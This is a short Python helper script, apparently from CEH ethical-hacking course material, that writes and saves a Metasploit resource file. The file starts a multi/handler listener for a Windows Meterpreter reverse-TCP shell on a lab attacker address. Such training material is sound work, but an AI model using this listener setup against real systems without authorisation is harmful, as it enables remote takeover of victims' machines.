#!/usr/bin/env python3
# LAB-ONLY: Metasploit Listener Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates Metasploit listener resource scripts for quick setup
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = "4444"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Metasploit Listener Helper")
    print("="*80)
    print("Create listener.rc:")
    rc_content = f"""use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {LAB_ATTACKER_IP}
set LPORT {LAB_ATTACKER_PORT}
set ExitOnSession false
exploit -j -z
"""
    print(rc_content)
    with open("listener.rc", "w") as f:
        f.write(rc_content)
    print("Saved listener.rc! Now run: msfconsole -r listener.rc")

if __name__ == "__main__":
    main()
